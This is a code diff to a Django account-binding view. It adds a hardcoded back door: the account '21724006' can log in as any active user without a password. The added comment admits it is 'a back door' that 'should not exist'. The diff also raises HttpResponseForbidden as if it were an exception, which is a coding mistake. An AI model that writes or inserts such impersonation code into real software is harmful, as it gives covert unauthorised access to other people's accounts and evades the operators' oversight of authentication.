@@ -208,6 +208,22 @@ def binding_view(request):
         if request.method == 'POST':
             new_username_end = request.user.username
             username = request.POST.get('username')
+            """
+            Super administrator will change identity through this method.
+            This codes should not exist in general becase this is a back door.
+            """
+            if request.user.username == '21724006':
+                new_user_set = User.objects.filter(username=username, is_active=True)
+                if new_user_set.count() > 0:
+                    new_user = new_user_set[0]
+                else:
+                    raise HttpResponseForbidden()
+                backend = load_backend(settings.AUTHENTICATION_BACKENDS[0])
+                new_user.backend = "%s.%s" % (
+                    backend.__module__, backend.__class__.__name__)
+                login(request, new_user)
+                return HttpResponseRedirect(reverse('homepage'))
+
             password = request.POST.get('password')
             binding_u = User.objects.get(email = username)
             if binding_u is not None and binding_u.username.split('_')[-1] == request.user.username:
